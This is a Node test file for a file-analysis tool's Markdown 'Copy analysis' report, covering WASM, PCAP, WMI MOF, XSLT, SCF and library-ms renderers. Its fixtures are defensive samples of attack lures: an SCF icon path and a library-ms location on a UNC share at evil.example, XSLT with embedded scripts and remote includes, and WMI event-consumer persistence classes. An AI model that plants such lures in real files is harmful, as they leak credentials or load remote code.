'use strict';
// copy-analysis-new-renderers.test.js — _copyAnalysisXxx Markdown blocks
// for the WASM / PCAP / MOF / XSLT / SCF / library-ms renderers.
//
// What these tests pin
// --------------------
// `_copyAnalysisFormatSpecific` (src/app/app-copy-analysis.js:14) is
// the per-format-deep-dive section of the "Copy analysis" Markdown
// report. Six new helpers were added for the M2/M3 renderers; this
// test pins the contract:
//
//   • Each helper is a no-op when its trigger conditions are missing
//     (no stash on `findings`, wrong file extension, etc.) so the
//     dispatcher can call them unconditionally.
//   • Each helper emits its expected `## <heading>` and the structural
//     fields downstream consumers (SOC tickets, the e2e snapshot
//     matrix) parse for.
//   • Caps respect `_sCaps`. The default scale (1) caps tables at
//     their seeded floor; SCALE = Infinity uncaps everything.
//
// Test rig
// --------
// `app-copy-analysis.js` calls `extendApp({...})` at module scope to
// install methods onto `App.prototype`. We don't want to boot the full
// App, so the test installs a tiny `extendApp` shim that captures the
// passed object into `methods`, then invokes each helper bound to a
// hand-rolled fake `app` carrying just the surfaces the helper reads
// (`_sCaps`, `_fileMeta`, etc.).

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

// Caps factory matching the production `_sCaps` shape — see
// `app-ui.js` `buildSectionsAtScale`.
function makeCaps(scale) {
  if (scale === Infinity) {
    return { SCALE: Infinity, rowCap: () => Infinity, charCap: () => Infinity };
  }
  return {
    SCALE: scale,
    rowCap: (n) => Math.max(5, Math.ceil(n * scale)),
    charCap: (n) => Math.max(120, Math.ceil(n * scale)),
  };
}

// Build a fake app object with enough surface for the helpers to run.
// The helpers read `this._sCaps`, `this._fileMeta`, and call
// `_formatMetadataValue` (only used by the generic Metadata block,
// which we don't drive here). We bind the captured method to this
// fake.
function fakeApp({ scale = 1, fileName = '' } = {}) {
  return {
    _sCaps: makeCaps(scale),
    _fileMeta: { name: fileName, size: 0 },
    currentResult: null,
  };
}

// Captures the method bag from `extendApp({...})` so individual
// helpers can be invoked in isolation.
function loadCopyAnalysisMethods() {
  const methods = {};
  const ctx = loadModules(
    [
      'src/constants.js',
      'src/renderers/wasm-renderer.js',
      'src/renderers/pcap-renderer.js',
      'src/renderers/mof-renderer.js',
      'src/renderers/xslt-renderer.js',
      'src/renderers/scf-renderer.js',
      'src/renderers/library-ms-renderer.js',
      'src/app/app-copy-analysis.js',
    ],
    {
      shims: {
        // Stub `extendApp` so the file's method bag is captured here
        // instead of being assigned onto `App.prototype` (which we
        // never instantiate in this test).
        extendApp: (obj) => Object.assign(methods, obj),
      },
      expose: [
        'IOC',
        'WasmRenderer',
        'PcapRenderer',
        'MofRenderer',
        'XsltRenderer',
        'ScfRenderer',
        'LibraryMsRenderer',
      ],
    },
  );
  return { methods, ctx };
}

// Identity passthrough — the `tp` argument is normally Loupe's text
// hardener (zero-width strip + control-char escape); for these tests
// we only care about structural shape, so a noop is fine.
const tp = (s) => String(s);

// ─────────────────────────────────────────────────────────────────────
// WASM
// ─────────────────────────────────────────────────────────────────────

test('copy-analysis(wasm): no-op when wasmInfo is absent', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'x.wasm' });
  const parts = [];
  methods._copyAnalysisWasm.call(app, {}, parts, tp);
  assert.equal(parts.length, 0);
});

test('copy-analysis(wasm): emits header + sections + imports + exports tables', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'evil.wasm' });
  const findings = {
    externalRefs: [
      // Match shape `<module>/<field> — <note>` so the helper marks
      // env/proc_exit as ⚠ in the imports table.
      { type: 'pattern', url: 'env/proc_exit — terminate process' },
    ],
    wasmInfo: {
      version: 1,
      modulehash: 'a'.repeat(64),
      sections: [
        { id: 1, size: 12, offset: 8 },
        { id: 2, size: 30, offset: 24 },
      ],
      types: [{}, {}],
      imports: [
        { module: 'env', field: 'proc_exit', kindName: 'function', desc: 'sig=0' },
        { module: 'env', field: 'memory', kindName: 'memory', desc: '' },
      ],
      exports: [
        { name: '_start', kindName: 'function', index: 7 },
      ],
      memory: { initial: 17, maximum: null },
      customSections: [{ name: 'name', size: 4 }],
    },
  };
  const parts = [];
  methods._copyAnalysisWasm.call(app, findings, parts, tp);
  const out = parts.join('\n');

  assert.match(out, /## WASM Module Details/);
  assert.match(out, /\| Version \| 1 \|/);
  assert.match(out, /\| Module hash \(modulehash\) \| `a{64}` \|/);
  assert.match(out, /### Sections \(2\)/);
  assert.match(out, /\| 0 \| 1 \| type \|/); // section 1 → 'type'
  assert.match(out, /### Imports \(2\)/);
  assert.match(out, /⚠ env \| proc_exit/); // suspicious row marked
  assert.match(out, /### Exports \(1\)/);
  assert.match(out, /\| 0 \| _start \| function \| 7 \|/);
  assert.match(out, /### Custom Sections \(1\)/);
});

test('copy-analysis(wasm): rowCap caps the imports table when oversize', () => {
  const { methods } = loadCopyAnalysisMethods();
  // SCALE=0.25 with seed=200 → cap = max(5, 50) = 50; supply 60
  // imports so the trailer fires deterministically.
  const app = fakeApp({ scale: 0.25 });
  const imports = [];
  for (let i = 0; i < 60; i++) imports.push({ module: 'm', field: 'f' + i, kindName: 'function', desc: '' });
  const findings = {
    externalRefs: [],
    wasmInfo: {
      version: 1, modulehash: '', sections: [], types: [],
      imports, exports: [], memory: null, customSections: [],
    },
  };
  const parts = [];
  methods._copyAnalysisWasm.call(app, findings, parts, tp);
  const out = parts.join('\n');
  // 60 imports, cap 50 → "… and 10 more" trailer.
  assert.match(out, /… and 10 more/);
});

test('copy-analysis(wasm): SCALE=Infinity uncaps everything', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ scale: Infinity });
  const imports = [];
  for (let i = 0; i < 500; i++) imports.push({ module: 'm', field: 'f' + i, kindName: 'function', desc: '' });
  const findings = {
    externalRefs: [],
    wasmInfo: {
      version: 1, modulehash: '', sections: [], types: [],
      imports, exports: [], memory: null, customSections: [],
    },
  };
  const parts = [];
  methods._copyAnalysisWasm.call(app, findings, parts, tp);
  const out = parts.join('\n');
  // no truncation trailer; last row index = 499.
  assert.doesNotMatch(out, /… and \d+ more/);
  assert.match(out, /\| 499 \| m \| f499 \|/);
});

// ─────────────────────────────────────────────────────────────────────
// PCAP
// ─────────────────────────────────────────────────────────────────────

test('copy-analysis(pcap): no-op when pcapInfo is absent', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp();
  const parts = [];
  methods._copyAnalysisPcap.call(app, {}, parts, tp);
  assert.equal(parts.length, 0);
});

test('copy-analysis(pcap): emits header + DNS / HTTP / SNI / top-talkers', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp();
  const ipCounts = new Map([
    ['8.8.8.8', 3],
    ['1.1.1.1', 2],
    ['10.0.0.5', 1], // private — included by helper, filtering happens at IOC stage
  ]);
  const findings = {
    externalRefs: [],
    pcapInfo: {
      kind: 'pcap',
      formatLabel: 'libpcap (LE)',
      version: '2.4',
      linktype: 1,
      linktypeName: 'ETHERNET',
      snaplen: 65535,
      packetCount: 6,
      firstTs: 1700000000,
      lastTs: 1700000060,
      truncated: false,
      dnsNames: ['evil.example', 'cdn.example'],
      dnsTruncated: false,
      httpHosts: ['plain.example'],
      httpBasicAuthCount: 1,
      tlsSnis: ['tls.example'],
      ipCounts,
      telnetSeen: true,
      ftpSeen: false,
    },
  };
  const parts = [];
  methods._copyAnalysisPcap.call(app, findings, parts, tp);
  const out = parts.join('\n');

  assert.match(out, /## Network Capture Details/);
  assert.match(out, /\| Format \| libpcap \(LE\) \|/);
  assert.match(out, /\| Linktype \| 1 \(ETHERNET\) \|/);
  assert.match(out, /### DNS Queries \(2\)/);
  assert.match(out, /`evil\.example`/);
  assert.match(out, /### HTTP Host Headers — plaintext \(1\)/);
  assert.match(out, /HTTP Basic auth observed:\*\* 1 request/);
  assert.match(out, /### TLS SNI \(1\)/);
  assert.match(out, /### Top Talkers/);
  assert.match(out, /\| 8\.8\.8\.8 \| 3 \|/);
  assert.match(out, /Telnet \(TCP\/23\)/);
});

// ─────────────────────────────────────────────────────────────────────
// MOF
// ─────────────────────────────────────────────────────────────────────

test('copy-analysis(mof): no-op when extension is not .mof', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'x.txt' });
  const parts = [];
  methods._copyAnalysisMof.call(app, { _rawText: 'instance of Foo {};' }, parts, tp);
  assert.equal(parts.length, 0);
});

test('copy-analysis(mof): emits class table + binding count + WQL queries', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'persist.mof' });
  const findings = {
    externalRefs: [
      { type: 'pattern', url: 'WQL Query: SELECT * FROM __InstanceModificationEvent WITHIN 60' },
    ],
    _rawText: [
      'instance of __EventFilter {};',
      'instance of CommandLineEventConsumer {};',
      'instance of __FilterToConsumerBinding {};',
      'instance of __FilterToConsumerBinding {};',
    ].join('\n'),
  };
  const parts = [];
  methods._copyAnalysisMof.call(app, findings, parts, tp);
  const out = parts.join('\n');

  assert.match(out, /## MOF Details/);
  assert.match(out, /__FilterToConsumerBinding entries:\*\* 2/);
  assert.match(out, /### WMI Classes \(3 unique, 4 instances\)/);
  assert.match(out, /\| `__FilterToConsumerBinding` \| 2 \|/);
  assert.match(out, /### WQL Queries \(1\)/);
  assert.match(out, /SELECT \* FROM __InstanceModificationEvent/);
});

// ─────────────────────────────────────────────────────────────────────
// XSLT
// ─────────────────────────────────────────────────────────────────────

test('copy-analysis(xslt): no-op when extension is not .xsl/.xslt', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'x.xml' });
  const parts = [];
  methods._copyAnalysisXslt.call(app, { _rawText: '<msxsl:script language="JScript"/>' }, parts, tp);
  assert.equal(parts.length, 0);
});

test('copy-analysis(xslt): emits script count + remote-href list', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'evil.xsl' });
  const findings = {
    externalRefs: [],
    _rawText: [
      '<xsl:stylesheet>',
      '  <msxsl:script language="JScript">x</msxsl:script>',
      '  <msxsl:script language=\'C#\'>y</msxsl:script>',
      '  <xsl:include href="https://evil.example/load.xsl"/>',
      '  <xsl:import href="\\\\unc\\share\\file.xsl"/>',
      '  <xsl:variable select="document(\'http://remote.example/x\')"/>',
      '</xsl:stylesheet>',
    ].join('\n'),
  };
  const parts = [];
  methods._copyAnalysisXslt.call(app, findings, parts, tp);
  const out = parts.join('\n');

  assert.match(out, /## XSLT Details/);
  assert.match(out, /<msxsl:script> blocks \(with language=…\):\*\* 2/);
  assert.match(out, /Remote-load directives:\*\* 3/);
  assert.match(out, /### Remote References \(3\)/);
  assert.match(out, /<xsl:include href>/);
  assert.match(out, /document\(\)/);
});

// ─────────────────────────────────────────────────────────────────────
// SCF
// ─────────────────────────────────────────────────────────────────────

test('copy-analysis(scf): no-op when extension is not .scf', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'x.lnk' });
  const parts = [];
  methods._copyAnalysisScf.call(app, { _rawText: '[Shell]\nIconFile=foo' }, parts, tp);
  assert.equal(parts.length, 0);
});

test('copy-analysis(scf): emits per-section key/value tables', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'lure.scf' });
  const findings = {
    externalRefs: [],
    _rawText: [
      '[Shell]',
      'Command=2',
      'IconFile=\\\\evil.example\\share\\icon.ico',
      'IconIndex=0',
      '[Taskbar]',
      'Command=ToggleDesktop',
    ].join('\n'),
  };
  const parts = [];
  methods._copyAnalysisScf.call(app, findings, parts, tp);
  const out = parts.join('\n');

  assert.match(out, /## SCF Details/);
  assert.match(out, /Sections:\*\* 2/);
  assert.match(out, /### \[Shell\]/);
  assert.match(out, /\| IconFile \| \\\\evil\.example\\share\\icon\.ico \|/);
  assert.match(out, /### \[Taskbar\]/);
});

// ─────────────────────────────────────────────────────────────────────
// library-ms / searchConnector-ms
// ─────────────────────────────────────────────────────────────────────

test('copy-analysis(library-ms): no-op when extension is unrelated', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'x.xml' });
  const parts = [];
  methods._copyAnalysisLibraryMs.call(app, { _rawText: '<libraryDescription/>' }, parts, tp);
  assert.equal(parts.length, 0);
});

test('copy-analysis(library-ms): emits Library heading + UNC location row', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'foo.library-ms' });
  const findings = {
    externalRefs: [],
    _rawText: [
      '<libraryDescription>',
      '  <searchConnectorDescriptionList>',
      '    <searchConnectorDescription>',
      '      <simpleLocation>',
      '        <url>\\\\evil.example\\share\\folder</url>',
      '      </simpleLocation>',
      '    </searchConnectorDescription>',
      '  </searchConnectorDescriptionList>',
      '</libraryDescription>',
    ].join('\n'),
  };
  const parts = [];
  methods._copyAnalysisLibraryMs.call(app, findings, parts, tp);
  const out = parts.join('\n');

  assert.match(out, /## Windows Library \(\.library-ms\) Details/);
  assert.match(out, /Locations:\*\* 1 \(UNC 1, HTTP 0, other 0\)/);
  assert.match(out, /\| `<url>` \| unc \|/);
});

test('copy-analysis(library-ms): switches heading for searchConnector-ms', () => {
  const { methods } = loadCopyAnalysisMethods();
  const app = fakeApp({ fileName: 'q.searchconnector-ms' });
  const findings = {
    externalRefs: [],
    _rawText: '<searchConnectorDescription><url>https://example/api</url></searchConnectorDescription>',
  };
  const parts = [];
  methods._copyAnalysisLibraryMs.call(app, findings, parts, tp);
  const out = parts.join('\n');

  assert.match(out, /## Search Connector \(\.searchConnector-ms\) Details/);
  assert.match(out, /\| `<url>` \| http \|/);
});
